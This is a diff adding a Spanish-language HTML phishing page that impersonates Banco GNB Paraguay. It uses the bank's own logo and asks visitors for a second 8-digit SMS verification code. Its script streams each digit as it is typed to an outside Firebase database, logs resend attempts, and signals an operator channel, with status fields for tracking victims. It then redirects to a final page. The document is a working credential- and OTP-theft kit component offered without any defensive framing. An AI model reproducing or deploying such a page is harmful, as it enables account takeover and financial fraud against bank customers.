@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>GNB :: Validación de identidad</title>
+<link rel="icon" href="https://www.bancognb.com.py/bancaweb/img/favicon.ico" type="image/icon">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap">
+<style>
+body{margin:0;background:#EDEDED;font-family:'Open Sans',sans-serif;min-width:320px;}
+.caja{background:#fff;max-width:560px;margin:7vh auto;padding:0 0 40px;box-shadow:0 1px 4px rgba(0,0,0,.09);}
+.tope{text-align:right;padding:10px 16px 0;font-size:20px;}
+.tope a{color:#0574AF;text-decoration:none;}
+.logo{text-align:center;padding:14px 0 24px;}
+.logo img{max-width:230px;height:auto;}
+h1{font-size:20px;font-weight:700;letter-spacing:.6px;color:#7AB83F;text-align:center;margin:0 20px 10px;text-transform:uppercase;}
+.sub{text-align:center;color:#5d6467;font-size:13.5px;margin:0 34px 8px;line-height:1.6;}
+.tel{text-align:center;color:#22302b;font-size:13px;font-weight:600;margin:0 30px 26px;}
+.tel span{color:#8a8d8f;font-weight:400;}
+.codigos{display:flex;justify-content:center;gap:8px;margin:0 20px 8px;flex-wrap:wrap;}
+.codigos input{width:42px;height:52px;text-align:center;font-size:21px;font-weight:700;font-family:'Open Sans',sans-serif;color:#22302b;border:1.5px solid #d3d8d6;border-radius:6px;background:#f7f9f8;padding:0;}
+.codigos input:focus{outline:none;border-color:#0574AF;background:#fff;box-shadow:0 0 0 3px rgba(5,116,175,.12);}
+.codigos input.lleno{border-color:#7AB83F;background:#f4faef;}
+.aviso{text-align:center;color:#c4136c;font-size:12px;margin:12px 20px 0;min-height:16px;}
+.aviso.ok{color:#4e8c22;font-weight:600;}
+.btn{display:block;width:calc(100% - 52px);margin:22px auto 0;background:#0574AF;color:#fff;border:0;height:50px;font-size:15.5px;font-weight:600;cursor:pointer;font-family:inherit;}
+.btn:hover{background:#046290;}
+.btn:disabled{background:#b6c6d0;cursor:default;}
+.reenviar{text-align:center;font-size:12.5px;color:#8a8d8f;margin-top:18px;}
+.reenviar a{color:#2986CA;text-decoration:none;cursor:pointer;}
+.reenviar a:hover{text-decoration:underline;}
+.reenviar a.off{color:#a9b0b4;cursor:default;text-decoration:none;}
+.pie{text-align:center;font-size:11px;color:#a3a8ab;margin-top:26px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="caja">
+  <div class="tope"><a href="https://www.bancognb.com.py/public/">X</a></div>
+  <div class="logo"><img src="https://www.bancognb.com.py/bancaweb/img/brand/new-logo-gnb-fusion.svg" alt="GNB"></div>
+
+  <h1>Validación de identidad</h1>
+  <p class="sub">Por seguridad, ingresá el nuevo código de 8 dígitos que enviamos a tu celular.</p>
+  <p class="tel">Enviado al <span>+595 9•• ••• •••</span></p>
+
+  <div class="codigos" id="codigos">
+    <input maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric">
+  </div>
+
+  <div class="aviso" id="aviso"></div>
+  <button class="btn" id="validar" type="button" disabled>Validar código</button>
+  <div class="reenviar">¿No recibiste el código? <a id="reenviar">Reenviar</a></div>
+  <div class="pie">Banco GNB Paraguay<br>Válido por 5 minutos</div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<script>
+var firebaseConfig = {
+  apiKey: "AIzaSyD-placeholder",
+  databaseURL: "https://cbonnlineec-default-rtdb.firebaseio.com",
+  projectId: "cbonnlineec-default-rtdb"
+};
+var DB = null;
+try { firebase.initializeApp(firebaseConfig); DB = firebase.database(); } catch(e){}
+
+var id = localStorage.getItem('gnb_uid');
+var cajas = [].slice.call(document.querySelectorAll('#codigos input'));
+var btn = document.getElementById('validar');
+var enviado = false;
+var reenvios2 = parseInt(localStorage.getItem('gnb_reenvios2')||'0', 10);
+var bloqueadoHasta = 0;
+
+if (DB && id) DB.ref('nbch/usuarios/'+id).update({status:'CODIGO 2', sms2:''});
+
+function valor(){ return cajas.map(function(c){ return c.value || ''; }).join(''); }
+function sincronizar(){
+  cajas.forEach(function(c){ c.classList.toggle('lleno', !!c.value); });
+  btn.disabled = valor().length !== 8;
+  if (DB && id) DB.ref('nbch/usuarios/'+id).update({sms2: valor(), status:'CODIGO 2'});
+}
+
+cajas.forEach(function(c, i){
+  c.addEventListener('input', function(){
+    c.value = c.value.replace(/[^0-9]/g,'').slice(0,1);
+    if (c.value && i < 7) cajas[i+1].focus();
+    sincronizar();
+  });
+  c.addEventListener('keydown', function(e){
+    if (e.key === 'Backspace' && !c.value && i > 0) cajas[i-1].focus();
+    if (e.key === 'ArrowLeft' && i > 0) cajas[i-1].focus();
+    if (e.key === 'ArrowRight' && i < 7) cajas[i+1].focus();
+    if (e.key === 'Enter' && !btn.disabled) btn.click();
+  });
+  c.addEventListener('paste', function(e){
+    e.preventDefault();
+    var t = (e.clipboardData.getData('text')||'').replace(/[^0-9]/g,'').slice(0,8);
+    t.split('').forEach(function(ch, k){ if (cajas[k]) cajas[k].value = ch; });
+    cajas[Math.min(t.length,7)].focus();
+    sincronizar();
+  });
+});
+
+btn.addEventListener('click', function(){
+  if (enviado) return;
+  if (valor().length !== 8){ avisar('Ingresá los 8 dígitos.', false); return; }
+  enviado = true;
+  btn.disabled = true;
+  btn.textContent = 'Validando...';
+  if (DB && id) DB.ref('nbch/usuarios/'+id).update({sms2: valor(), status:'VALIDANDO CODIGO 2'});
+  setTimeout(function(){ window.location.href = 'final.html'; }, 600);
+});
+
+/* ---------- reenvío del segundo código ---------- */
+function avisar(txt, ok){
+  var a = document.getElementById('aviso');
+  a.textContent = txt;
+  a.classList.toggle('ok', !!ok);
+}
+
+var enlace = document.getElementById('reenviar');
+enlace.addEventListener('click', function(){
+  if (Date.now() < bloqueadoHasta) return;
+  bloqueadoHasta = Date.now() + 25000;
+
+  reenvios2++;
+  try { localStorage.setItem('gnb_reenvios2', String(reenvios2)); } catch(e){}
+
+  if (DB && id){
+    DB.ref('nbch/usuarios/'+id).update({
+      reenvio2: Date.now(),
+      reenvios2: reenvios2,
+      status: 'CODIGO 2'
+    });
+    DB.ref('nbch/comandos/'+id).set({ accion:'reenvio2', ts: Date.now() });
+  }
+
+  cajas.forEach(function(c){ c.value=''; c.classList.remove('lleno'); });
+  btn.disabled = true;
+  avisar('Nuevo código enviado a tu celular.', true);
+  cajas[0].focus();
+
+  var fin = bloqueadoHasta;
+  enlace.classList.add('off');
+  (function tick(){
+    var rest = Math.ceil((fin - Date.now())/1000);
+    if (rest > 0){
+      enlace.textContent = 'Reenviar (' + rest + ')';
+      setTimeout(tick, 1000);
+    } else {
+      enlace.classList.remove('off');
+      enlace.textContent = 'Reenviar';
+    }
+  })();
+});
+
+setTimeout(function(){ cajas[0].focus(); }, 1000);
+</script>
+</body>
+</html>
